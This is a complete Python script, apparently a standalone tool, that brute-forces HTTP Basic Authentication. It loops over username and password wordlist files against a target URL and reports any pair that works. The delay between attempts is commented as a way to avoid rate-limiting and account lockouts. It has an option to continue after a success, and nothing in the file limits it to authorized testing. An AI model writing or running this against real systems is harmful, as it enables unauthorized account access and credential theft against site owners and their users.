import sys
import time
import requests
from requests.auth import HTTPBasicAuth
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

def load_file(filepath):
    try:
        with open(filepath, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(Fore.RED + f"[!] Error reading {filepath}: {e}")
        sys.exit(1)

def brute_force(url, usernames, passwords, full_scan=False, delay=0.5):
    print(Fore.CYAN + f"[*] Starting brute-force on: {url}\n")
    found = False

    for username in usernames:
        for password in passwords:
            try:
                response = requests.get(url, auth=HTTPBasicAuth(username, password), timeout=5)
                if response.status_code == 200:
                    print(Fore.GREEN + f"[+] SUCCESS → Username: '{username}' | Password: '{password}'")
                    found = True
                    if not full_scan:
                        sys.exit(0)
                else:
                    print(Fore.YELLOW + f"[-] Failed → Username: '{username}' | Password: '{password}'")
            except requests.RequestException as e:
                print(Fore.RED + f"[!] Request error for {username}:{password} → {e}")
            
            time.sleep(delay)  # Avoid rate-limiting or lockouts

    if not found:
        print(Fore.RED + "\n[*] Brute-force complete. No valid credentials found.")
        sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) < 4 or len(sys.argv) > 5:
        print(f"Usage: python3 {sys.argv[0]} <url> <usernames_file> <passwords_file> [--full-scan]")
        sys.exit(1)

    url = sys.argv[1]
    usernames_file = sys.argv[2]
    passwords_file = sys.argv[3]
    full_scan = "--full-scan" in sys.argv

    usernames = load_file(usernames_file)
    passwords = load_file(passwords_file)

    brute_force(url, usernames, passwords, full_scan=full_scan)
